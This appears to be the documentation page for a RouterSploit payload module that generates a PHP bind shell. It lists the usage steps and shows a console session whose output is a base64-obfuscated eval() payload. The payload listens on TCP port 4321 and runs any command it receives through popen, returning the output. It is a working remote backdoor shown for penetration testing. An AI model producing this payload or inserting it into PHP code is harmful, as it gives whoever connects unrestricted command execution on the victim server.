## Description

Module generates payload that creates interactive tcp bind shell by using php. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/php/bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates php tcp bind shell payload

## Scenarios

```
rsf > use payloads/php/bind_tcp
rsf (PHP Bind TCP) > set rport 4321
[+] rport => 4321
rsf (PHP Bind TCP) > run
[*] Running module...
[*] Generating payload
eval(base64_decode('JHM9c29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApO3NvY2tldF9iaW5kKCRzLCIwLjAuMC4wIiw0MzIxKTtzb2NrZXRfbGlzdGVuKCRzLDEpOyRjbD1zb2NrZXRfYWNjZXB0KCRzKTt3aGlsZSgxKXtpZighc29ja2V0X3dyaXRlKCRjbCwiJCAiLDIpKWV4aXQ7JGluPXNvY2tldF9yZWFkKCRjbCwxMDApOyRjbWQ9cG9wZW4oIiRpbiIsInIiKTt3aGlsZSghZmVvZigkY21kKSl7JG09ZmdldGMoJGNtZCk7c29ja2V0X3dyaXRlKCRjbCwkbSxzdHJsZW4oJG0pKTt9fQ=='));
```
